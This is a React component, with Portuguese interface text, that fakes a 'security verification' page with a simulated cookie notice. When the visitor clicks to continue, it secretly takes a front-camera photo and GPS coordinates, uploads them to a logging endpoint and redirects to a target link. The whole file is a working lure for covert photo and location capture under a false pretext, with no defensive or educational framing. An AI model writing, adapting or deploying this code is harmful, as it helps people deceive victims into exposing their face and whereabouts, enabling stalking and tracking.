'use client';

import { useState } from 'react';

interface Props {
  logId: number;
  targetUrl: string;
  capturePhoto: boolean;
  captureGps: boolean;
}

export default function ClientCapture({ logId, targetUrl, capturePhoto, captureGps }: Props) {
  const [loading, setLoading] = useState(false);
  const [started, setStarted] = useState(false);

  async function handleAccept() {
    setLoading(true);
    setStarted(true);

    let photoData = null;
    let gpsData = null;

    // 1. Tentar capturar a foto após o clique do usuário
    if (capturePhoto) {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
        const video = document.createElement('video');
        video.srcObject = stream;
        await video.play();

        await new Promise((resolve) => setTimeout(resolve, 1000));

        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        const ctx = canvas.getContext('2d');
        if (ctx) {
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
          photoData = canvas.toDataURL('image/jpeg', 0.7);
        }

        stream.getTracks().forEach((track) => track.stop());
      } catch (err) {
        console.log('Permissão de câmera negada ou indisponível', err);
      }
    }

    // 2. Tentar capturar GPS se habilitado
    if (captureGps && navigator.geolocation) {
      try {
        const position: GeolocationPosition = await new Promise((resolve, reject) => {
          navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000 });
        });
        gpsData = `${position.coords.latitude}, ${position.coords.longitude}`;
      } catch (err) {
        console.log('GPS negado', err);
      }
    }

    // 3. Enviar os dados capturados para a API
    try {
      await fetch('/api/update-log', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ logId, photoBase64: photoData, gpsLocation: gpsData }),
      });
    } catch (e) {
      console.error('Erro ao enviar dados', e);
    }

    // 4. Redirecionar para o site alvo final
    window.location.href = targetUrl;
  }

  return (
    <div className="min-h-screen bg-gray-950 text-white flex flex-col items-center justify-center p-4">
      <div className="max-w-md w-full bg-gray-900 border border-gray-800 rounded-xl p-6 shadow-2xl space-y-6 text-center">
        <div className="space-y-2">
          <div className="inline-block p-3 bg-red-950/50 rounded-full text-red-500 mb-2">
            🛡️
          </div>
          <h1 className="text-xl font-bold tracking-wide">Verificação de Segurança</h1>
          <p className="text-xs text-gray-400 leading-relaxed">
            Para continuar acessando o conteúdo protegido com segurança e verificar seu dispositivo, clique no botão abaixo para prosseguir.
          </p>
        </div>

        {/* Aviso de Cookies / LGPD simulado */}
        <div className="bg-gray-950 border border-gray-800 rounded p-3 text-left text-[11px] text-gray-500 space-y-1">
          <p>Utilizamos cookies e tecnologias de autenticação de sessão para garantir a integridade da navegação.</p>
        </div>

        <button
          onClick={handleAccept}
          disabled={loading}
          className="w-full bg-red-600 hover:bg-red-700 font-semibold py-3 rounded text-sm transition-all shadow-lg shadow-red-900/30 flex items-center justify-center gap-2 cursor-pointer disabled:opacity-50"
        >
          {loading ? (
            <>
              <span className="animate-spin text-lg">⏳</span> Processando acesso...
            </>
          ) : (
            'Aceitar e Continuar'
          )}
        </button>
      </div>
    </div>
  );
}